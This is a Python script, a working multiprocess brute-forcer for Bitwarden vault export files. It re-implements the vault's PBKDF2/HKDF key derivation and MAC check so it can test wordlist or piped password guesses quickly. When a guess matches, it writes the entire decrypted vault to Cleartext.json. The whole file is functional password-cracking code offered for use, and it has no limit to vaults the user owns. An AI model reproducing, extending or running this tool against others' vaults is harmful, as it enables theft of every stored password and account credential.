#!/usr/bin/env python3
"""Fast parallel Bitwarden vault brute-forcer.

Usage:
    python3 brute.py data.json wordlist.txt
    python3 brute.py data.json -                  # read from stdin
    python3 WordlistGenerator.py | python3 brute.py data.json -
"""

import argparse
import base64
import json
import multiprocessing
import os
import signal
import sys
import time

from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.hkdf import HKDFExpand
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ── Shared globals (set before pool fork, inherited by workers) ──────────
_email = None
_kdf_iterations = None
_enc_key_iv = None
_enc_key_ct = None
_enc_key_mac = None


def init_globals(email, kdf_iterations, enc_key_cipher_string):
    """Parse vault parameters into module globals so forked workers inherit them."""
    global _email, _kdf_iterations, _enc_key_iv, _enc_key_ct, _enc_key_mac

    _email = email
    _kdf_iterations = kdf_iterations

    parts = enc_key_cipher_string.split(".")[1].split("|")
    _enc_key_iv = base64.b64decode(parts[0])
    _enc_key_ct = base64.b64decode(parts[1])
    _enc_key_mac = base64.b64decode(parts[2])


def try_password(password):
    """Test a single password candidate. Returns (password, True) on success."""
    pw_bytes = password.encode("utf-8")

    # 1. PBKDF2 → master key
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=_email.encode("utf-8"),
        iterations=_kdf_iterations,
        backend=default_backend(),
    )
    master_key = kdf.derive(pw_bytes)

    # 2. HKDF-Expand → stretched MAC key
    hkdf = HKDFExpand(
        algorithm=hashes.SHA256(),
        length=32,
        info=b"mac",
        backend=default_backend(),
    )
    stretched_mac_key = hkdf.derive(master_key)

    # 3. MAC check (fast rejection — no AES needed on mismatch)
    h = hmac.HMAC(stretched_mac_key, hashes.SHA256(), backend=default_backend())
    h.update(_enc_key_iv)
    h.update(_enc_key_ct)
    calculated_mac = h.finalize()

    if calculated_mac != _enc_key_mac:
        return (password, False)

    # 4. MAC matched — derive stretched enc key and attempt AES decrypt + unpad
    hkdf = HKDFExpand(
        algorithm=hashes.SHA256(),
        length=32,
        info=b"enc",
        backend=default_backend(),
    )
    stretched_enc_key = hkdf.derive(master_key)

    cipher = Cipher(algorithms.AES(stretched_enc_key), modes.CBC(_enc_key_iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(_enc_key_ct) + decryptor.finalize()

    try:
        unpadder = padding.PKCS7(128).unpadder()
        unpadder.update(decrypted) + unpadder.finalize()
    except Exception:
        return (password, False)

    return (password, True)


def password_stream(source):
    """Yield stripped password lines from a file path or stdin ('-')."""
    if source == "-":
        for line in sys.stdin:
            pw = line.rstrip("\n\r")
            if pw:
                yield pw
    else:
        with open(source) as f:
            for line in f:
                pw = line.rstrip("\n\r")
                if pw:
                    yield pw


def do_full_decrypt(datafile, password):
    """Run the full vault decryption and write Cleartext.json."""
    # Import the original decryptor for the full vault dump
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import BitwardenDecrypt

    class Options:
        pass

    opts = Options()
    opts.inputfile = datafile
    opts.password = password
    opts.includesends = False

    decrypted_json = BitwardenDecrypt.decryptBitwardenJSON(opts)
    with open("Cleartext.json", "w") as f:
        f.write(decrypted_json)

    print(f"\nSUCCESS! Password: {password}")
    print("Decrypted vault written to Cleartext.json")


def main():
    parser = argparse.ArgumentParser(description="Fast parallel Bitwarden vault brute-forcer.")
    parser.add_argument("datafile", help="Path to Bitwarden data.json")
    parser.add_argument("wordlist", help="Path to wordlist file, or '-' for stdin")
    parser.add_argument("-w", "--workers", type=int, default=multiprocessing.cpu_count(),
                        help="Number of parallel workers (default: CPU count)")
    parser.add_argument("--chunk", type=int, default=64,
                        help="Passwords per worker chunk (default: 64)")
    args = parser.parse_args()

    # Load vault data
    try:
        with open(args.datafile) as f:
            data = json.load(f)
    except FileNotFoundError:
        print(f"ERROR: {args.datafile} not found.", file=sys.stderr)
        sys.exit(1)

    email = data["userEmail"]
    kdf_iterations = data["kdfIterations"]
    enc_key = data["encKey"]

    init_globals(email, kdf_iterations, enc_key)

    print(f"Vault:      {args.datafile}", file=sys.stderr)
    print(f"Email:      {email}", file=sys.stderr)
    print(f"KDF iters:  {kdf_iterations:,}", file=sys.stderr)
    print(f"Workers:    {args.workers}", file=sys.stderr)
    print(f"Wordlist:   {'stdin' if args.wordlist == '-' else args.wordlist}", file=sys.stderr)
    print("", file=sys.stderr)

    # For stdin we must read all passwords upfront (can't fork + share stdin)
    if args.wordlist == "-":
        passwords = list(password_stream("-"))
        total_known = len(passwords)
    else:
        passwords = password_stream(args.wordlist)
        total_known = None

    tested = 0
    found = False
    start = time.time()

    # Ignore SIGINT in workers so the parent can handle Ctrl+C cleanly
    original_sigint = signal.signal(signal.SIGINT, signal.SIG_IGN)
    pool = multiprocessing.Pool(processes=args.workers, initializer=_worker_init)
    signal.signal(signal.SIGINT, original_sigint)

    try:
        for password, success in pool.imap_unordered(try_password, passwords, chunksize=args.chunk):
            tested += 1

            if tested % 10 == 0 or success:
                elapsed = time.time() - start
                rate = tested / elapsed if elapsed > 0 else 0
                if total_known:
                    pct = tested / total_known * 100
                    print(f"\r  Tested: {tested:,}/{total_known:,} ({pct:.1f}%)  |  {rate:.1f} pw/s  |  {elapsed:.0f}s elapsed",
                          end="", file=sys.stderr)
                else:
                    print(f"\r  Tested: {tested:,}  |  {rate:.1f} pw/s  |  {elapsed:.0f}s elapsed",
                          end="", file=sys.stderr)

            if success:
                print("", file=sys.stderr)
                pool.terminate()
                found = True
                do_full_decrypt(args.datafile, password)
                break

    except KeyboardInterrupt:
        print("\n\nInterrupted. Stopping workers...", file=sys.stderr)
        pool.terminate()
    finally:
        pool.join()

    if not found:
        elapsed = time.time() - start
        rate = tested / elapsed if elapsed > 0 else 0
        print(f"\n\nExhausted {tested:,} passwords in {elapsed:.1f}s ({rate:.1f} pw/s). Password not found.",
              file=sys.stderr)
        sys.exit(1)


def _worker_init():
    """Ignore SIGINT in worker processes."""
    signal.signal(signal.SIGINT, signal.SIG_IGN)


if __name__ == "__main__":
    main()
